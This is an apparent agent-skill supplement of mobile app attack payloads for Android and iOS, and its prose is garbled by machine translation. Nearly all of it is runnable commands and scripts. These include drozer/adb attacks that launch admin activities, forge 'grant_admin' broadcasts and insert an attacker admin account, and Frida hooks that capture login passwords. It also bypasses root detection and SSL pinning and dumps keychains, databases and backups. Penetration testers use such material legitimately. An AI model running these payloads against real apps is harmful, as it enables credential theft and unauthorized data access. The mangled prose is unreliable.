# Mobile Security Payloads

> thisfileas `SKILL.md` Supplementary Files，containsmovedynamicsecurity 攻防allchainpath command、scriptand Payload。

---

## 1. Android APK analysis

### 1.1 APK decompilation

```bash
# apktool decompilation（alsooriginal Manifest + smali code）
apktool d app.apk -o app_source -f

# jadx decompilationascan read Java sourcecode
jadx app.apk -d app_java

# jadx-gui graphicalizebrowse
jadx-gui app.apk
```

### 1.2 Manifest security audit

```bash
# checkexportcomponent
grep -n "exported=\"true\"" app_source/AndroidManifest.xml

# check debuggable flag
grep -n "debuggable=\"true\"" app_source/AndroidManifest.xml

# check allowBackup
grep -n "allowBackup=\"true\"" app_source/AndroidManifest.xml

# checkplaintextflowamount许can
grep -n "usesCleartextTraffic=\"true\"" app_source/AndroidManifest.xml

# checkdangerouspermission
grep -n "android.permission." app_source/AndroidManifest.xml | grep -E "READ_CONTACTS|READ_SMS|ACCESS_FINE_LOCATION|CAMERA|RECORD_AUDIO|READ_PHONE_STATE"
```

### 1.3 hardencodingcredentialsScan

```bash
# generalcredentialsScan
grep -rn "api_key\|secret\|password\|token" app_java/ --include="*.java"

# AWS Access Key Detect
grep -rn "AKIA[0-9A-Z]\{16\}" app_java/ --include="*.java"

# notsecurity storagemode
grep -rn "MODE_WORLD_READABLE\|getSharedPreferences" app_java/ --include="*.java"

# URL andendpointdiscovery
grep -rn "http://\|https://\|\.com/\|\.cn/" app_java/ --include="*.java" | grep -v "android\|google\|java."

# Base64 encoding credentials
grep -rn "Base64.decode\|base64_decode" app_java/ --include="*.java"
```

### 1.4 drozer IPC attack

```bash
# connect drozer
drozer console connect

# obtainattack surface
run app.package.attacksurface com.target.app

# Enumerateexport Activity
run app.activity.info -a com.target.app

# startexport Activity
run app.activity.start --component com.target.app com.target.app.AdminActivity

# Enumerate Content Provider
run app.provider.info -a com.target.app

# query Content Provider data
run app.provider.query content://com.target.app.provider/users

# Enumerate Broadcast Receiver
run app.broadcast.info -a com.target.app

# sendmaliciousbroadcast
run app.broadcast.send --component com.target.app com.target.app.SecretReceiver --extra string action grant_admin
```

### 1.5 adb commandset

```bash
# installapplication
adb install app.apk

# listalready installpackage
adb shell pm list packages | grep target

# obtainapplicationpath
adb shell pm path com.target.app

# clearapplicationdata
adb shell pm clear com.target.app

# start Activity
adb shell "am start -n com.target.app/.AdminActivity"

# sendbroadcast
adb shell "am broadcast -n com.target.app/.SecretReceiver --es action 'grant_admin'"

# query Content Provider
adb shell "content query --uri content://com.target.app.provider/users"

# Deep Link attack
adb shell "am start -a android.intent.action.VIEW -d 'targetapp://admin/panel'"

# forwardport
adb forward tcp:27042 tcp:27042   # Frida
adb forward tcp:8080 tcp:8080     # Proxy

# intercept屏
adb shell screencap -p /sdcard/screen.png && adb pull /sdcard/screen.png

# viewlog
adb logcat -s "com.target.app" | grep -i "error\|exception\|login\|auth"
```

---

## 2. iOS IPA analysis

### 2.1 IPA solvepackageandstaticanalysis

```bash
# decompression IPA
unzip app.ipa -d app_extracted

# class-dump exportheadfile
class-dump -H app_extracted/Payload/App.app -o app_headers

# check Info.plist security configuration
plutil -p app_extracted/Payload/App.app/Info.plist

# check ATS（App Transport Security）configuration
plutil -p app_extracted/Payload/App.app/Info.plist | grep -A5 "NSAppTransportSecurity"

# check URL Scheme register
plutil -p app_extracted/Payload/App.app/Info.plist | grep -A5 "CFBundleURLSchemes"
```

### 2.2 Frida iOS analysis

```bash
# listrunin process
frida-ps -U

# Enumeratealready installapplication
frida-ps -Uai

# Spawn modestartandinjection
frida -U -f com.target.app -l hook.js --no-pause

# Attach toruninprocess
frida -U "Target App" -l hook.js
```

### 2.3 Objection iOS explore

```bash
# start objection
objection -g com.target.app explore

# Enumerate Keychain itemtarget
ios keychain dump

# Enumeratealready storage Cookie
ios cookies get

# dump UserDefaults
ios nsuserdefaults get

# Enumeratebinaryprotectmechanism
ios binaries ls

# SSL Pinning Bypass
ios sslpinning disable
```

---

## 3. Runtime Manipulation（Frida script）

### 3.1 credentialsintercept

```javascript
// Hook 登录方法截获用户名和密码
Java.perform(function() {
    var LoginActivity = Java.use('com.target.app.LoginActivity');
    LoginActivity.authenticate.implementation = function(username, password) {
        console.log('[+] Username: ' + username);
        console.log('[+] Password: ' + password);
        return this.authenticate(username, password);
    };
});
```

### 3.2 encryptionfunction Hook

```javascript
// Hook Cipher.doFinal 截获加密明文和密文
Java.perform(function() {
    var Cipher = Java.use('javax.crypto.Cipher');
    Cipher.doFinal.overload('[B').implementation = function(data) {
        var result = this.doFinal(data);
        console.log('[+] Mode: ' + this.getOpmode() + ' In: ' + bytesToHex(data));
        console.log('[+] Out: ' + bytesToHex(result));
        return result;
    };
});

function bytesToHex(b) {
    var h = '';
    for (var i = 0; i < b.length; i++) {
        h += ('0' + (b[i] & 0xFF).toString(16)).slice(-2);
    }
    return h;
}
```

### 3.3 Root/Jailbreak Detectbypass

```javascript
// 绕过 Root 检测（常见模式）
Java.perform(function() {
    // Hook 文件存在性检查
    var File = Java.use('java.io.File');
    File.exists.implementation = function() {
        var path = this.getAbsolutePath();
        var rootPaths = ['/su', '/supersu', '/magisk', '/Superuser.apk'];
        for (var i = 0; i < rootPaths.length; i++) {
            if (path.indexOf(rootPaths[i]) >= 0) {
                console.log('[+] Root check bypassed for: ' + path);
                return false;
            }
        }
        return this.exists();
    };
});
```

### 3.4 activityclassEnumerate

```javascript
// 枚举所有已加载的类
Java.perform(function() {
    Java.enumerateLoadedClasses({
        onMatch: function(className) {
            if (className.indexOf('com.target') >= 0) {
                console.log('[+] ' + className);
            }
        },
        onComplete: function() {
            console.log('[*] Enumeration complete');
        }
    });
});
```

---

## 4. Network Traffic Interception

### 4.1 Burp Suite proxyconfiguration

```bash
# setdeviceproxypoint to Burp
# 1. deviceandhostsameanetwork
# 2. device WiFi proxysetupashost IP:8080
# 3. install Burp CA certificate:
# - browsetoolaccess http://burp
# - download CA Certificate
# - Android: Settings > Security > Install from storage
# - iOS: installdescriptionfileafterto Settings > General > About > Certificate Trust Settings enable

# export Burp CA as PEM format（used for Android 7+ system cert）
openssl x509 -inform DER -in burp_ca.der -out burp_ca.pem

# obtainsystemcertificatehashname
openssl x509 -inform PEM -subject_hash_old -in burp_ca.pem | head -1
# 重命nameas <hash>.0 andpush送to /system/etc/security/cacerts/
```

### 4.2 mitmproxy

```bash
# start mitmproxy interactiveinterface
mitmproxy --listen-port 8080

# start mitmweb（Web interface）
mitmweb --listen-port 8080

# usescriptfilterflowamount
mitmdump -s "capture.py" --set flow_detail=3

# captureandsaveflowamount
mitmdump -w traffic.flow --listen-port 8080
```

---

## 5. Local Storage Analysis

### 5.1 Android SharedPreferences

```bash
# read SharedPreferences XML
adb shell "su -c 'cat /data/data/com.target.app/shared_prefs/*.xml'"

# Extractspecificconfigurationfile
adb shell "su -c 'cat /data/data/com.target.app/shared_prefs/com.target.app_preferences.xml'"

# check MODE_WORLD_READABLE filepermission
adb shell "su -c 'ls -la /data/data/com.target.app/shared_prefs/'"
```

### 5.2 SQLite database

```bash
# Extractapplicationdatabase
adb pull /data/data/com.target.app/databases/app.db

# listall table
sqlite3 app.db ".tables"

# queryusertable
sqlite3 app.db "SELECT * FROM users;"

# queryall credentialsrelatedField
sqlite3 app.db "SELECT * FROM sqlite_master WHERE type='table';"

# exportall data
sqlite3 app.db ".dump" > app_dump.sql
```

### 5.3 externalstorageleakage

```bash
# checkexternalstorage
adb shell "ls -la /sdcard/Android/data/com.target.app/"
adb shell "ls -la /sdcard/com.target.app/"

# pullexternalstoragefile
adb pull /sdcard/Android/data/com.target.app/ ./external_storage/
```

### 5.4 allowBackup data extraction

```bash
# createbackup
adb backup -f app.ab com.target.app

# solvepackagebackupfile
dd if=app.ab bs=24 skip=1 | openssl zlib -d > app.tar
tar xf app.tar

# oruse Android Backup Extractor (ABE)
java -jar abe.jar unpack app.ab app.tar
```

### 5.5 iOS Keychain analysis

```bash
# use objection dump Keychain
objection -g com.target.app explore
# > ios keychain dump

# use Keychain-Dumper（越狱device）
keychain_dumper > keychain_dump.txt
```

---

## 6. Intent / URL Scheme Exploitation

### 6.1 export Activity attack

```bash
# directstartexport Activity
adb shell "am start -n com.target.app/.AdminActivity"

# bandparameterstart
adb shell "am start -n com.target.app/.ProfileActivity --es user_id '1' --es role 'admin'"

# drozer method
run app.activity.start --component com.target.app com.target.app.AdminActivity
```

### 6.2 Content Provider dataleakage

```bash
# query Provider
adb shell "content query --uri content://com.target.app.provider/users"

# insertdata
adb shell "content insert --uri content://com.target.app.provider/users --bind name:s:attacker --bind role:s:admin"

# drozer SQL injectiontesting
run scanner.provider.injection -a com.target.app
run scanner.provider.traversal -a com.target.app
```

### 6.3 Broadcast Receiver attack

```bash
# sendmaliciousbroadcast
adb shell "am broadcast -n com.target.app/.SecretReceiver --es action 'grant_admin'"

# sendsystembroadcastforgery
adb shell "am broadcast -a android.intent.action.BOOT_COMPLETED -n com.target.app/.BootReceiver"
```

### 6.4 Deep Link / URL Scheme attack

```bash
# fromdefinition Scheme attack
adb shell "am start -a android.intent.action.VIEW -d 'targetapp://admin/panel'"

# HTTP Deep Link
adb shell "am start -a android.intent.action.VIEW -d 'https://targetapp.com/reset_password?token=attacker'"

# iOS URL Scheme
open "targetapp://admin/panel"
```

---

## 7. Certificate Pinning Bypass

### 7.1 Frida — OkHttp CertificatePinner bypass

```javascript
// OkHttp CertificatePinner 绕过
Java.perform(function() {
    var CertificatePinner = Java.use('okhttp3.CertificatePinner');
    CertificatePinner.check.overload('java.lang.String', 'java.util.List')
        .implementation = function(hostname, peerCertificates) {
            console.log('[+] SSL Pinning bypassed for: ' + hostname);
        };
});
```

### 7.2 Frida — TrustManager generalbypass

```javascript
// TrustManager 通用绕过
Java.perform(function() {
    var TM = Java.use('javax.net.ssl.X509TrustManager');
    var BypassTM = Java.registerClass({
        name: 'com.bypass.TrustManager',
        implements: [TM],
        methods: {
            checkClientTrusted: function(c, a) {},
            checkServerTrusted: function(c, a) {},
            getAcceptedIssuers: function() { return []; }
        }
    });

    var SSLContext = Java.use('javax.net.ssl.SSLContext');
    SSLContext.init.overload(
        '[Ljavax.net.ssl.KeyManager;',
        '[Ljavax.net.ssl.TrustManager;',
        'java.security.SecureRandom'
    ).implementation = function(km, tm, sr) {
        this.init(km, [BypassTM.$new()], sr);
    };
});
```

### 7.3 Objection fast捷method

```bash
# start objection
objection -g com.target.app explore

# Android SSL Pinning Bypass
android sslpinning disable

# iOS SSL Pinning Bypass
ios sslpinning disable
```

### 7.4 general Frida SSL Bypass script

```bash
# usegeneral SSL Bypass script
frida -U -f com.target.app -l ssl_bypass.js --no-pause

# oftenuseopen-sourcescript
# https://github.com/httptoolkit/frida-android-unpinning
# https://github.com/Allybits/Android-SSL-Bypass
```

---

## 8. Android Debug Bridge (adb) quick reference

### 8.1 devicemanagement

```bash
# listconnectdevice
adb devices

# enter shell
adb shell

# with root identityenter
adb root && adb shell

# restartdevice
adb reboot

# install/uninstallapplication
adb install app.apk
adb uninstall com.target.app
```

### 8.2 fileoperation

```bash
# push送filetodevice
adb push local_file /data/local/tmp/

# pullfile
adb pull /data/data/com.target.app/databases/app.db ./

# synchronousdirectory
adb push ./tools/ /data/local/tmp/tools/
```

### 8.3 debugandlog

```bash
# realwhen log
adb logcat

# filterspecifictag
adb logcat -s "TAG_NAME"

# filterspecificapplication
adb logcat | grep "com.target.app"

# dump systeminformation
adb shell dumpsys package com.target.app
```
